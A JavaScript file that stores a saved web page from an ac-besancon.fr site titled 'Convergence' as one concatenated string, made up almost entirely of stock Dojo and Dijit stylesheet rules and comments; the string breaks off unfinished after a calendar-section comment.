var my_var = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" class="dj_webkit dj_chrome dj_contentbox"><head>'+
'<link rel="icon" data-savepage-href="https://convergences.ac-besancon.fr/favicon.ico" href="">'+
'  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">'+
'  <!-- Mimic Internet Explorer 7 -->'+
'  <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">'+
'  <title>Convergence</title>'+
'  <style type="text/css">'+
'   /*savepage-import-url=../../../js/dojotoolkit/dojo/resources/dojo.css*//*'+
' dojo.css'+
' Baseline CSS file for general usage.'+
''+
' This file is intended to be a "quick and dirty" stylesheet you can use to give'+
' a straight-up web page some basic styling without having to do the dirty work'+
' yourself.  It includes a modified version of YUI\'s reset.css (we pulled some'+
' of the list reset definitions, among other things), and then provides some very'+
' basic style rules to be applied to general HTML elements.'+
''+
' This stylesheet is NOT intended to serve as the foundation for more complex things--'+
' including the use of a TABLE for layout purposes.  The table definitions in this'+
' file make the assumption that you will be using tables for thier declared purpose:'+
' displaying tabular data.'+
''+
' If you are looking for a baseline stylesheet using tables for grid layout, you will'+
' need to supply your own layout rules to override the ones in this stylesheet.'+
' '+
' Applications using Dojo will function correctly without including this'+
' file, but it should provide sane defaults for many common things that page'+
' authors often need to set up manually.'+
''+
' The Dojo Core uses this stylesheet to quickly style HTML-based tests and demos.  Feel'+
' free to use it as you will.'+
'*/'+
''+
'/*****************************************************************************************/'+
''+
'/*'+
' The below are borrowed from YUI\'s reset style sheets for pages and fonts.'+
' We\'ve verified w/ the YUI development team that these are entirely'+
' copyright Yahoo, written entirely by Nate Koechley and Matt Sweeney without'+
' external contributions.'+
''+
' Copyright (c) 2007, Yahoo! Inc. All rights reserved.'+
' Code licensed under the BSD License:'+
' http://developer.yahoo.net/yui/license.txt'+
' version: 2.2.1'+
'*/'+
''+
'body, div, dl, dt, dd, li, h1, h2, h3, h4, h5, h6, pre, form, fieldset, input, textarea, p, blockquote, th, td {'+
' margin: 0;'+
' padding: 0;'+
'}'+
''+
'fieldset, img {'+
' border: 0 none;'+
'}'+
''+
'address, caption, cite, code, dfn, th, var {'+
' font-style: normal;'+
' font-weight: normal;'+
'}'+
''+
'caption, th {'+
' text-align: left;'+
'}'+
''+
'q:before, q:after {'+
' content:"";'+
'}'+
''+
'abbr, acronym {'+
' border:0;'+
'}'+
'/* End YUI imported code. */'+
''+
'/*****************************************************************************************/'+
''+
'/*'+
' Begin Dojo additions.'+
''+
' Style definitions, based loosely on the Dijit Tundra theme.'+
' Relative unit calculations based on "Compose to a Vertical Rhythm",'+
' by Richard Rutter (http://24ways.org/2006/compose-to-a-vertical-rhythm)'+
''+
' If changing the font size, make sure you do it in both'+
' percent and px (% for IE, px for everything else).'+
' % value based on default size of 16px (in most browsers).'+
' So if you want the default size to be 14px, set the'+
' % to 87% (14 / 16 = 0.875).'+
''+
' Typical values:'+
' 10px: 62.5%'+
' 11px: 69% (68.75)'+
' 12px: 75%'+
' 13px: 81.25%'+
' 14px: 87.5%'+
' 16px: 100%'+
''+
' Default: 12px'+
'*/'+
'body {'+
' font: 12px Myriad,Helvetica,Tahoma,Arial,clean,sans-serif;'+
' *font-size: 75%;'+
'}'+
''+
'/* Headings */'+
'h1 {'+
' font-size: 1.5em;'+
' font-weight: normal;'+
' line-height: 1em;'+
' margin-top: 1em;'+
' margin-bottom:0;'+
'}'+
''+
'h2 {'+
' font-size: 1.1667em;'+
' font-weight: bold;'+
' line-height: 1.286em;'+
' margin-top: 1.929em;'+
' margin-bottom:0.643em;'+
'}'+
''+
'h3, h4, h5, h6 {'+
' font-size: 1em;'+
' font-weight: bold;'+
' line-height: 1.5em;'+
' margin-top: 1.5em;'+
' margin-bottom: 0;'+
'}'+
''+
'/* paragraphs, quotes and lists */'+
'p {'+
' font-size: 1em;'+
' margin-top: 1.5em;'+
' margin-bottom: 1.5em;'+
' line-height: 1.5em;'+
'}'+
''+
'blockquote {'+
' font-size: 0.916em;'+
' margin-top: 3.272em;'+
' margin-bottom: 3.272em;'+
' line-height: 1.636em;'+
' padding: 1.636em;'+
' border-top: 1px solid #ccc;'+
' border-bottom: 1px solid #ccc;'+
'}'+
''+
'ol li, ul li {'+
' font-size: 1em;'+
' line-height: 1.5em;'+
' margin: 0;'+
'}'+
''+
'/* pre and code */'+
'pre, code {'+
' font-size:115%;'+
' *font-size:100%;'+
' font-family: Courier, "Courier New";'+
' background-color: #efefef;'+
' border: 1px solid #ccc;'+
'}'+
''+
'pre {'+
' border-width: 1px 0;'+
' padding: 1.5em;'+
'}'+
''+
'/*'+
' Tables'+
''+
' Note that these table definitions make the assumption that you are using tables'+
' to display tabular data, and NOT using tables as layout mechanisms.  If you are'+
' using tables for layout, you will probably want to override these rules with'+
' more specific ones.'+
''+
' These definitions make tabular data look presentable, particularly when presented'+
' inline with paragraphs.'+
'*/'+
'table {  font-size:100%; }'+
''+
'table.dojoTabular {'+
' border-collapse: collapse;'+
' border-spacing: 0;'+
' border: 1px solid #ccc;'+
' margin: 0 1.5em;'+
'}'+
''+
'.dojoTabular th {'+
' text-align: center;'+
' font-weight: bold;'+
'}'+
''+
'table.dojoTabular thead, table.dojoTabular tfoot {'+
' background-color: #efefef;'+
' border: 1px solid #ccc;'+
' border-width: 1px 0;'+
'}'+
''+
'table.dojoTabular thead tr th,'+
'table.dojoTabular thead tr td,'+
'table.dojoTabular tbody tr td,'+
'table.dojoTabular tfoot tr td {'+
' padding: 0.25em 0.5em;'+
'}'+
''+
'   /*savepage-import-url=../../../js/dojotoolkit/dijit/themes/dijit.css*//*'+
' Essential styles that themes can inherit.'+
' In other words, works but doesn\'t look great.'+
'*/'+
''+
''+
''+
'/****'+
'  GENERIC PIECES'+
' ****/'+
''+
'.dijitReset {'+
' /* Use this style to null out padding, margin, border in your template elements'+
'  so that page specific styles don\'t break them.'+
'  - Use in all TABLE, TR and TD tags.'+
' */'+
' margin:0;'+
' border:0;'+
' padding:0;'+
' line-height:normal;'+
' font: inherit;'+
' color: inherit;'+
'}'+
''+
'.dijitInline {'+
' /*  To inline block elements.'+
'  Similar to InlineBox below, but this has fewer side-effects in Moz.'+
'  Also, apparently works on a DIV as well as a FIELDSET.'+
' */'+
' display:-moz-inline-box;		/* FF2 */'+
' display:inline-block;			/* webkit and FF3 */'+
' #zoom: 1; /* set hasLayout:true to mimic inline-block */'+
' #display:inline; /* don\'t use .dj_ie since that increases the priority */'+
' border:0;'+
' padding:0;'+
' vertical-align:middle;'+
' #vertical-align: auto;	/* makes TextBox,Button line up w/native counterparts on IE6 */'+
'}'+
''+
'.dijitHidden {'+
' /* To hide unselected panes in StackContainer etc. */'+
' display: none !important;'+
'}'+
''+
'.dijitVisible {'+
' /* To show selected pane in StackContainer etc. */'+
' display: block !important;	/* override user\'s display:none setting via style setting or indirectly via class */'+
' position: relative;			/* to support setting width/height, see #2033 */'+
'}'+
''+
''+
'.dj_ie INPUT.dijitTextBox,'+
'.dj_ie .dijitInputField INPUT {'+
' font-size: 100%;'+
'}'+
''+
'.dj_ie .dijitInputField INPUT { /* try to get rid of IE implicit margin around INPUT */'+
' margin: -1px 0 !important;'+
'}'+
''+
'.dijitInlineTable {'+
' /* To inline tables with a given width set (otherwise, use dijitInline above)'+
'  * Must also put style="-moz-inline-stack" on the node itself to workaround FF2 bugs'+
'  */'+
' display: -moz-inline-stack;	/* FF2 */'+
' display:inline-table;'+
' display:inline-block;		/* webkit and FF3 */'+
' #zoom: 1; /* set hasLayout:true to mimic inline-block */'+
' #display:inline; /* don\'t use .dj_ie since that increases the priority */'+
' box-sizing: content-box; -moz-box-sizing: content-box;'+
' border:0;'+
' padding:0;'+
'}'+
''+
'.dijitTeeny {'+
' font-size:1px;'+
' line-height:1px;'+
'}'+
''+
'/*'+
' * Popup items have a wrapper div (dijitPopup)'+
' * with the real popup inside, and maybe an iframe too'+
' */'+
'.dijitPopup {'+
' position: absolute;'+
' background-color: transparent;'+
' margin: 0;'+
' border: 0;'+
' padding: 0;'+
'}'+
'.dijit_a11y .dijitPopup,'+
'.dijit_ally .dijitPopup div,'+
'.dijit_a11y .dijitPopup table,'+
'.dijit_a11y .dijitTooltipContainer {'+
' background-color: white !important;'+
'}'+
''+
'.dijitInputField {'+
' overflow:hidden;'+
' #zoom:1;'+
'}'+
''+
'.dijitPositionOnly {'+
' /* Null out all position-related properties */'+
' padding: 0 !important;'+
' border: 0 !important;'+
' background-color: transparent !important;'+
' background-image: none !important;'+
' height: auto !important;'+
' width: auto !important;'+
'}'+
''+
'.dijitNonPositionOnly {'+
' /* Null position-related properties */'+
' float: none !important;'+
' position: static !important;'+
' margin: 0 0 0 0 !important;'+
' vertical-align: middle !important;'+
'}'+
''+
'.dijitBackgroundIframe {'+
' /*'+
'  * iframe used for FF2 in high-contrast mode to prevent menu'+
'  * being transparent'+
'  */'+
' position: absolute;'+
' left: 0;'+
' top: 0;'+
' width: 100%;'+
' height: 100%;'+
' z-index: -1;'+
' border: 0;'+
' padding: 0;'+
' margin: 0;'+
'}'+
''+
'.dijitClickableRegion {'+
' /* An InlineEditBox in view mode (click this to edit the text) */'+
' background-color: #e2ebf2;'+
' cursor: text;'+
'}'+
''+
''+
'.dijitDisplayNone {'+
' /* hide something.  Use this as a class rather than element.style so another class can override */'+
' display:none !important;'+
'}'+
''+
'.dijitContainer {'+
' /* for all layout containers */'+
' overflow: hidden;	/* need on IE so something can be reduced in size, and so scrollbars aren\'t temporarily displayed when resizing */'+
'}'+
''+
'.dijitEllipsis {'+
' /* truncate container overflow with ... */'+
' overflow: hidden;'+
' text-overflow: ellipsis;'+
' -o-text-overflow: ellipsis;'+
' -ms-text-overflow: ellipsis;'+
' -moz-binding: /*savepage-url=../resources/ellipsis.xml#ellipsis*/ url();'+
'}'+
''+
'/****'+
'  A11Y'+
' ****/'+
'.dijit_a11y * {'+
' background-image:none !important;'+
'}'+
''+
'.dijit_a11y .dijitCalendarIncrementControl {'+
' display: none;	/* don\'t display icon */'+
'}'+
'.dijit_a11y .dijitA11ySideArrow {'+
' display: inline !important; /* display text instead */'+
' cursor: pointer;'+
'}'+
''+
'.dijit_a11y .dijitCalendarSelectedDate {'+
' text-decoration:overline !important;'+
'}'+
''+
'.dijit_a11y .dijit * {'+
' background:white !important;'+
' color:black !important;'+
'}'+
'.dijit_a11y .dijitButtonNode {'+
' border-color: black!important;'+
' border-style: outset!important;'+
' border-width: medium!important;'+
'}'+
''+
'.dijit_a11y .dijitButtonDisabled .dijitButtonNode,'+
'.dijit_a11y .dijitDropDownButtonDisabled .dijitButtonNode,'+
'.dijit_a11y .dijitComboButtonDisabled .dijitButtonNode,'+
'.dijit_a11y .dijitComboBoxDisabled .dijitInputField,'+
'.dijit_a11y .dijitComboBoxDisabled .dijitButtonNode,'+
'.dijit_a11y .dijitSpinnerDisabled .dijitButtonNode,'+
'.dijit_a11y .dijitSpinnerDisabled .dijitInputField {'+
' border-style: outset!important;'+
' border-width: medium!important;'+
' border-color: #999 !important;'+
' color:#999 !important;'+
'}'+
''+
'.dj_ff2 .dijit_a11y .dijitComboButton .dijitButtonContentsFocused,'+
'.dj_ff2 .dijit_a11y .dijitComboButton .dijitDownArrowButtonFocused {'+
' border: 1px dotted black !important;'+
'}'+
''+
'/* button inner contents - labels, icons etc. */'+
'.dijitButtonNode * {'+
' vertical-align: middle;'+
'}'+
'.dijit_a11y .dijitArrowButtonInner {'+
' width: 1em;'+
' display: none !important;'+
'}'+
'.dijitButtonNode .dijitArrowButtonInner {'+
' background:no-repeat center;'+
' width: 16px;'+
'}'+
'.dijitComboBox .dijitArrowButtonInner {'+
' display: block;'+
'}'+
''+
'/* In high contrast mode, display the check symbol */'+
'.dijit_a11y .dijitToggleButtonChecked .dijitToggleButtonIconChar {'+
' display: inline !important;'+
'}'+
''+
''+
'/****'+
'  3-element borders:  ( dijitLeft + dijitStretch + dijitRight )'+
' ****/'+
' '+
'.dijitLeft {'+
' /* Left part of a 3-element border */'+
' background-position:left top;'+
' background-repeat:no-repeat;'+
'}'+
''+
'.dijitStretch {'+
' /* Middle (stretchy) part of a 3-element border */'+
' white-space:nowrap;			/* MOW: move somewhere else */'+
' background-repeat:repeat-x;'+
'}'+
''+
'.dijitRight {'+
' /* Right part of a 3-element border */'+
' #display:inline;				/* IE7 sizes to outer size w/o this */'+
' background-position:right top;'+
' background-repeat:no-repeat;'+
'}'+
''+
'.dijitButton,'+
'.dijitDropDownButton,'+
'.dijitComboButton {'+
' /* outside of button */'+
' margin: 0.2em;'+
'}'+
''+
'.dijitToolbar .dijitButton,'+
'.dijitToolbar .dijitDropDownButton,'+
'.dijitToolbar .dijitComboButton {'+
' margin: 0;'+
'}'+
''+
'.dj_ie8 .dijitToolbar button,'+
'.dj_webkit .dijitToolbar button {'+
' /* FF and IE<8 adds implicit padding to buttons, so make other browsers follow suit,'+
'  * to avoid a bunch of browse specific rules in theme files'+
'  */'+
' padding: 1px 2px;'+
'}'+
''+
'.dj_ie .dijitToolbar .dijitComboBox{'+
' /* make combobox buttons align porperly with other buttons in a toolbar */'+
' vertical-align: middle;'+
'}'+
''+
'.dj_ie .dijitComboButton {'+
' /* hack to get inline-table to vertically align w/other buttons */'+
' margin-bottom: -3px;'+
'}'+
''+
'.dj_webkit .dijitToolbar .dijitDropDownButton {'+
' padding-left: 0.3em;'+
'}'+
'.dj_gecko .dijitToolbar .dijitButtonNode::-moz-focus-inner {'+
' padding:0;'+
'}'+
''+
'.dijitButtonNode {'+
' /* Node that is acting as a button -- may or may not be a BUTTON element */'+
' border:1px solid gray;'+
' margin:0;'+
' line-height:normal;'+
' vertical-align: middle;'+
' #vertical-align: auto;'+
' text-align:center;'+
' white-space: nowrap;'+
'}'+
''+
'.dijitButtonNode, .dijitButtonNode * {'+
' cursor: pointer;'+
'}'+
''+
'/**** Disabled cursor *****/'+
'.dijitReadOnly *,'+
'.dijitDisabled *,'+
'.dijitReadOnly,'+
'.dijitDisabled,'+
'.dijitDisabledClickableRegion {	/* a region the user would be able to click on, but it\'s disabled */'+
' cursor: not-allowed !important;'+
'}'+
''+
'.dj_ie .dijitButtonNode {'+
' /* ensure hasLayout */'+
' zoom: 1;'+
'}'+
''+
'.dj_ie .dijitButtonNode button {'+
' /*'+
'  disgusting hack to get rid of spurious padding around button elements'+
'  on IE. MSIE is truly the web\'s boat anchor.'+
' */'+
' overflow: visible;'+
'}'+
''+
'.dijitArrowButton {'+
' /* Node that is acting as a arrow button -- drop down (spinner has its own treatment).  Also gets dijitButtonNode */'+
' /* place AFTER dijitButtonNode so it overrides */'+
' padding: 0 .4em;'+
'}'+
'DIV.dijitArrowButton {'+
' float: right;'+
'}'+
''+
'.dijitSpinner .dijitInputLayoutContainer .dijitArrowButton {'+
' border-style: solid;'+
' border-width: 0 0 0 1px !important;'+
' padding: 0;'+
' position: absolute;'+
' right: 0;'+
' float: none;'+
'}'+
'.dijitSpinner .dijitInputLayoutContainer .dijitArrowButton {'+
' position: absolute;'+
' height: 50%;'+
'}'+
'.dijitSpinner .dijitInputLayoutContainer .dijitDownArrowButton {'+
' top: auto;'+
' bottom: 0;'+
' border-top-width: 1px !important;'+
'}'+
'.dijitSpinner .dijitInputLayoutContainer .dijitUpArrowButton {'+
' top: 0;'+
' bottom: auto;'+
'}'+
''+
'TABLE.dijitComboButton {'+
' /* In ComboButton, borders are on each cell rather than on <table> itself */'+
' border-collapse: collapse;'+
' border:0;'+
' padding:0;'+
' margin:0;'+
'}'+
'.dijitToolbar .dijitComboButton {'+
' /* because Toolbar only draws a border around the hovered thing */'+
' border-collapse: separate;'+
'}'+
''+
'.dj_ie BUTTON.dijitButtonNode {'+
' overflow: visible; /* eliminates arbitrary left and right padding on buttons */'+
'}'+
''+
'table .dijitButton .dijitButtonNode,'+
'table .dijitComboButton .dijitButtonNode {'+
' #overflow:hidden; /* visible messes up if the button is inside a table on IE */'+
'}'+
''+
''+
''+
'.dijitButtonNode IMG {'+
' /* make text and images line up cleanly */'+
' vertical-align:middle;'+
' /*margin-bottom:.2em;*/'+
'}'+
''+
'/******'+
' TextBox related.'+
' Everything that has an <input>'+
'*******/'+
''+
'.dijitTextBox,'+
'.dijitComboBox,'+
'.dijitSpinner {'+
' border: solid black 1px;'+
' #overflow: hidden; /* #6027, #6067 */'+
' width: 15em;	/* need to set default size on outer node since inner nodes say <input style="width:100%"> and <td width=100%>.  user can override */'+
' vertical-align: middle;'+
' #vertical-align: auto;'+
'}'+
''+
'.dijitTimeTextBox {'+
' width: 8em;'+
'}'+
''+
'/* rules for safari to deal with fuzzy blue focus border */'+
'.dijitTextBox input:focus,'+
'.dijitComboBox input:focus,'+
'.dijitSpinner input:focus {'+
' outline: none;	/* blue fuzzy line looks wrong on combobox or something w/validation icon showing */'+
'}'+
'.dijitTextBoxFocused,'+
'.dijitComboBoxFocused,'+
'.dijitSpinnerFocused, .dijitSpinnerUpArrowActive, .dijitSpinnerDownArrowActive,'+
'.dijitTextAreaFocused {'+
' /* should we display focus like we do on other browsers, or use the safari standard focus indicator?? */'+
' outline: auto 5px -webkit-focus-ring-color;'+
'}'+
'.dijitTextAreaFocused div {'+
' /* prevent dotted border on FF3 */'+
' outline: none !important;'+
'}'+
''+
'.dijitTextBox INPUT,'+
'.dijitComboBox INPUT,'+
'.dijitSpinner INPUT {'+
' border-left: solid black 1px;	/* TODO: for RTL mode should be border-right */'+
' display:inline;'+
' position:static !important;'+
' border:0 !important;'+
' margin:0 !important;'+
' vertical-align:top !important;'+
' background-color:transparent !important;'+
' background-image:none !important;'+
' width:100%;'+
'}'+
''+
'/* Display an "X" for invalid input. Themes will override these rules to display an icon instead.'+
'*/'+
'.dijitValidationIcon {'+
' visibility: hidden;'+
' display: block;'+
' padding: 0 2px;'+
' float: right;'+
' height: auto;'+
'}'+
'.dijitValidationIconText {'+
' visibility: hidden;'+
' display: none;'+
' float:right;'+
' font-family: sans-serif;'+
' font-style:italic;'+
' font-size: 0.75em;'+
' padding-right: 0.15em;'+
' line-height: 160%;'+
'}'+
'.dijit_a11y .dijitValidationIcon { display: none !important; }'+
'.dijit_a11y .dijitValidationIconText { display: block !important; }'+
''+
'.dijitError .dijitValidationIcon,'+
'.dijitError .dijitValidationIconText {'+
' visibility: visible;'+
'}'+
''+
'.dijitTextBox .dijitArrowButton {'+
' /* this is for a combo box with no arrow displayed; we set baseClass=TextBox */'+
' display:none;'+
'}'+
''+
'/****'+
'  dijit.form.CheckBox'+
'   &'+
'    dijit.form.RadioButton'+
' ****/'+
''+
'.dijitCheckBox,'+
'.dijitRadio,'+
'.dijitCheckBoxInput {'+
' padding: 0;'+
' border: 0;'+
' width: 16px;'+
' height: 16px;'+
' background-position:center center;'+
' background-repeat:no-repeat;'+
' overflow: hidden;'+
'}'+
''+
'.dijitCheckBox INPUT,'+
'.dijitRadio INPUT {'+
' margin: 0;'+
' padding: 0;'+
' display: block;'+
'}'+
''+
'.dijitCheckBoxInput {'+
' /* place the actual input on top, but all-but-invisible */'+
' opacity: 0.01;'+
'}'+
''+
'.dj_ie .dijitCheckBoxInput {'+
' filter: alpha(opacity=0);'+
'}'+
''+
'.dijit_a11y .dijitCheckBox,'+
'.dijit_a11y .dijitRadio {'+
' width: auto;'+
' height: auto;'+
'}'+
'.dijit_a11y .dijitCheckBoxInput {'+
' opacity: 1;'+
' filter: none;'+
' width: auto;'+
' height: auto;'+
'}'+
''+
''+
'/****'+
'  dijit.ProgressBar'+
' ****/'+
''+
'.dijitProgressBarEmpty{'+
' /* outer container and background of the bar that\'s not finished yet*/'+
' position:relative;overflow:hidden;'+
' border:1px solid black; 	/* a11y: border necessary for high-contrast mode */'+
' z-index:0;			/* establish a stacking context for this progress bar */'+
'}'+
''+
'.dijitProgressBarFull {'+
' /* outer container for background of bar that is finished */'+
' position:absolute;'+
' overflow:hidden;'+
' z-index:-1;'+
' top:0;'+
' width:100%;'+
'}'+
'.dj_ie6 .dijitProgressBarFull {'+
' height:1.6em;'+
'}'+
''+
'.dijitProgressBarTile {'+
' /* inner container for finished portion */'+
' position:absolute;'+
' overflow:hidden;'+
' top:0;'+
' left:0;'+
' bottom:0;'+
' right:0;'+
' margin:0;'+
' padding:0;'+
' width:auto;'+
' height:auto;'+
' background-color:#aaa;'+
' background-attachment: fixed;'+
'}'+
''+
'.dijit_a11y .dijitProgressBarTile{'+
' /* a11y:  The border provides visibility in high-contrast mode */'+
' border-width:4px;'+
' border-style:solid;'+
' background-color:transparent !important;'+
'}'+
''+
'.dj_ie6 .dijitProgressBarTile {'+
' /* width:auto works in IE6 with position:static but not position:absolute */'+
' position:static;'+
' /* height:auto or 100% does not work in IE6 */'+
' height:1.6em;'+
'}'+
''+
'.dijitProgressBarIndeterminate .dijitProgressBarLabel {'+
' visibility:hidden;'+
'}'+
''+
'.dijitProgressBarIndeterminate .dijitProgressBarTile {'+
' /* animated gif for \'indeterminate\' mode */'+
'}'+
''+
'.dijitProgressBarIndeterminateHighContrastImage {'+
' display:none;'+
'}'+
''+
'.dijit_a11y .dijitProgressBarIndeterminate .dijitProgressBarIndeterminateHighContrastImage {'+
' display:block;'+
' position:absolute;'+
' top:0;'+
' bottom:0;'+
' margin:0;'+
' padding:0;'+
' width:100%;'+
' height:auto;'+
'}'+
''+
'.dijitProgressBarLabel {'+
' display:block;'+
' position:static;'+
' width:100%;'+
' text-align:center;'+
' background-color:transparent !important;'+
'}'+
''+
'/****'+
'  dijit.Tooltip'+
' ****/'+
''+
'.dijitTooltip {'+
' position: absolute;'+
' z-index: 2000;'+
' display: block;'+
' /* make visible but off screen */'+
' left: 50%;'+
' top: -10000px;'+
' overflow: visible;'+
'}'+
''+
'.dijitTooltipContainer {'+
' border: solid black 2px;'+
' background: #b8b5b5;'+
' color: black;'+
' font-size: small;'+
'}'+
''+
'.dijitTooltipFocusNode {'+
' padding: 2px 2px 2px 2px;'+
'}'+
''+
'.dijitTooltipConnector {'+
' position: absolute;'+
'}'+
''+
'.dijitTooltipData {'+
' display:none;'+
'}'+
'/* MOW: using actual images at this time'+
'/* draw an arrow with CSS only * /'+
'.dijitTooltipConnector {'+
' /* the border on the triangle * /'+
' font-size: 0; line-height: 0%; width: 0;'+
' border-top: none;'+
' border-bottom: 14px solid black;'+
' border-left: 7px solid transparent;'+
' border-right: 7px solid transparent;'+
' top: -14px;'+
' left: 3px;'+
' z-index: 2;'+
'}'+
''+
'.dijitTooltipConnector div {'+
' /* the background of the triangle * /'+
' font-size: 0; line-height: 0%; width: 0;'+
' position: absolute;'+
' border-bottom: 10px solid #b8b5b5;'+
' border-left: 5px solid transparent;'+
' border-right: 5px solid transparent;'+
' top: 6px;'+
' left: -5px;'+
' z-index: 3;'+
'}'+
''+
'*/'+
''+
''+
''+
'/* Layout widgets. This is essential CSS to make layout work (it isn\'t "styling" CSS)'+
'   make sure that the position:absolute in dijitAlign* overrides other classes */'+
''+
'.dijitLayoutContainer{'+
' position: relative;'+
' display: block;'+
' overflow: hidden;'+
'}'+
''+
'body .dijitAlignTop,'+
'body .dijitAlignBottom,'+
'body .dijitAlignLeft,'+
'body .dijitAlignRight {'+
' position: absolute;'+
' overflow: hidden;'+
'}'+
''+
'body .dijitAlignClient { position: absolute; }'+
''+
'/*'+
' * BorderContaienr'+
' *'+
' * .dijitBorderContainer is a stylized layout where panes have border and margin.'+
' * .dijitBorderContainerNoGutter is a raw layout.'+
' */'+
'.dijitBorderContainer, .dijitBorderContainerNoGutter {'+
' position:relative;'+
' overflow: hidden;'+
'}'+
''+
'.dijitBorderContainerPane,'+
'.dijitBorderContainerNoGutterPane {'+
' position: absolute !important;	/* !important to override position:relative in dijitTabContainer etc. */'+
' z-index: 2;		/* above the splitters so that off-by-one browser errors don\'t cover up border of pane */'+
'}'+
''+
'.dijitBorderContainer > .dijitTextArea {'+
' /* On Safari, for SimpleTextArea inside a BorderContainer,'+
'  don\'t want to display the grip to resize */'+
' resize: none;'+
'}'+
''+
'.dijitGutter {'+
' /* gutter is just a place holder for empty space between panes in BorderContainer */'+
' position: absolute;'+
' font-size: 1px;		/* needed by IE6 even though div is empty, otherwise goes to 15px */'+
'}'+
''+
'/* SplitContainer'+
''+
' \'V\' == container that splits vertically (up/down)'+
' \'H\' = horizontal (left/right)'+
'*/'+
''+
'.dijitSplitter {'+
' position: absolute;'+
' overflow: hidden;'+
' z-index: 10;		/* above the panes so that splitter focus is visible on FF, see #7583*/'+
' background-color: #fff;'+
' border-color: gray;'+
' border-style: solid;'+
' border-width: 0;'+
'}'+
'.dj_ie .dijitSplitter {'+
' z-index: 1;	/* behind the panes so that pane borders aren\'t obscured see test_Gui.html/[14392] */'+
'}'+
''+
'.dijitSplitterActive {'+
' z-index: 11 !important;'+
'}'+
''+
'.dijitSplitterCover{'+
' position:absolute;'+
' z-index:-1;'+
' top:0;'+
' left:0;'+
' width:100%;'+
' height:100%;'+
'}'+
''+
'.dijitSplitterCoverActive{'+
' z-index:3 !important;'+
'}'+
''+
'/* #6945: stop mouse events */'+
'.dj_ie .dijitSplitterCover{'+
' background: white;'+
' filter: alpha(opacity=0);'+
'}'+
''+
'.dijitSplitterH {'+
' height: 7px;'+
' border-top:1px;'+
' border-bottom:1px;'+
' cursor: ns-resize;'+
'}'+
'.dijitSplitterV {'+
' width: 7px;'+
' border-left:1px;'+
' border-right:1px;'+
' cursor: ew-resize;'+
'}'+
'.dijitSplitContainer{'+
' position: relative;'+
' overflow: hidden;'+
' display: block;'+
'}'+
''+
'.dijitSplitPane{'+
' position: absolute;'+
'}'+
''+
'.dijitSplitContainerSizerH,'+
'.dijitSplitContainerSizerV {'+
' position:absolute;'+
' font-size: 1px;'+
' cursor: move;'+
' cursor: w-resize;'+
' background-color: ThreeDFace;'+
' border: 1px solid;'+
' border-color: ThreeDHighlight ThreeDShadow ThreeDShadow ThreeDHighlight;'+
' margin: 0;'+
'}'+
''+
'.dijitSplitContainerSizerH .thumb, .dijitSplitterV .dijitSplitterThumb {'+
' overflow:hidden;'+
' position:absolute;'+
' top:49%;'+
'}'+
''+
'.dijitSplitContainerSizerV .thumb, .dijitSplitterH .dijitSplitterThumb {'+
' position:absolute;'+
' left:49%;'+
'}'+
''+
'.dijitSplitterShadow,'+
'.dijitSplitContainerVirtualSizerH,'+
'.dijitSplitContainerVirtualSizerV {'+
' font-size: 1px;'+
' background-color: ThreeDShadow;'+
' -moz-opacity: 0.5;'+
' opacity: 0.5;'+
' filter: Alpha(Opacity=50);'+
' margin: 0;'+
'}'+
''+
'.dj_ie .dijitSplitterV, .dijitSplitContainerVirtualSizerH {'+
' cursor: w-resize;'+
'}'+
'.dj_ie .dijitSplitterH, .dijitSplitContainerSizerV, .dijitSplitContainerVirtualSizerV {'+
' cursor: n-resize;'+
'}'+
''+
'.dijit_a11y .dijitSplitterH {'+
' border-top:1px solid #d3d3d3 !important;'+
' border-bottom:1px solid #d3d3d3 !important;'+
'}'+
'.dijit_a11y .dijitSplitterV {'+
' border-left:1px solid #d3d3d3 !important;'+
' border-right:1px solid #d3d3d3 !important;'+
'}'+
''+
'/* ContentPane */'+
''+
'.dijitContentPane {'+
' display: block;'+
' overflow: auto;	/* if we don\'t have this (or overflow:hidden), then Widget.resizeTo() doesn\'t make sense for ContentPane */'+
'}'+
'/* TitlePane */'+
'.dijitTitlePane {'+
' display: block;'+
' overflow: hidden;'+
'}'+
''+
'/* Color Palette */'+
''+
'.dijitColorPalette {'+
' border:1px solid #999;'+
' background:#fff;'+
' -moz-border-radius:3pt;'+
'}'+
''+
'img.dijitColorPaletteUnder {'+
' border-style:none;'+
' position:absolute;'+
' left:0;'+
' top:0;'+
'}'+
'.dijitColorPaletteInner {'+
' position: relative;'+
' overflow:hidden;'+
' outline:0;'+
'}'+
'.dijitPaletteCell {'+
' width: 20px;'+
' height: 20px;'+
' position: absolute;'+
' overflow: hidden;'+
' z-index: 10;'+
' outline-width: 0;'+
'}'+
'.dijitPaletteImg {'+
' width: 16px; /*This is the width of one color in the provided palettes. */'+
' height: 14px; /* Height of one color in the provided palettes. */'+
' position: absolute;'+
' top: 1px;'+
' left: 1px;'+
' overflow: hidden;'+
' cursor: default;'+
' border:1px solid #999;'+
' /* -moz-border-radius:2pt; */'+
'}'+
''+
'.dijitPaletteCellHighlight img {'+
' width: 14px; /*This is the width of one color in the provided palettes. */'+
' height: 12px; /* Height of one color in the provided palettes. */'+
' position: absolute;'+
' top: 1px;'+
' left: 1px;'+
' overflow: hidden;'+
' cursor: default;'+
' border:2px solid #000;'+
' outline:1px solid #dedede;'+
' /* -moz-border-radius:0; */'+
'}'+
''+
'.dijit_a11y .dijitPaletteCell {'+
' background-color:transparent !important;'+
'}'+
'.dijit_a11y .dijitPaletteImg {'+
' background-color:transparent !important;'+
'}'+
''+
'.dijitAccordionContainer {'+
' border:1px solid #b7b7b7;'+
' border-top:0 !important;'+
'}'+
''+
'.dijitAccordionTitle {'+
' cursor: pointer;'+
'}'+
''+
'/* images off, high-contrast mode styles */'+
'.dijitAccordionTitle .arrowTextUp,'+
'.dijitAccordionTitle .arrowTextDown {'+
' display: none;'+
' font-size: 0.65em;'+
' font-weight: normal !important;'+
'}'+
''+
'.dijit_a11y .dijitAccordionTitle .arrowTextUp {'+
' display: inline;'+
'}'+
'.dijit_a11y .dijitAccordionTitle-selected .arrowTextDown {'+
' display: inline;'+
'}'+
''+
'.dijit_a11y .dijitAccordionTitle-selected .arrowTextUp {'+
' display: none;'+
'}'+
''+
'/* Calendar */'+
''+
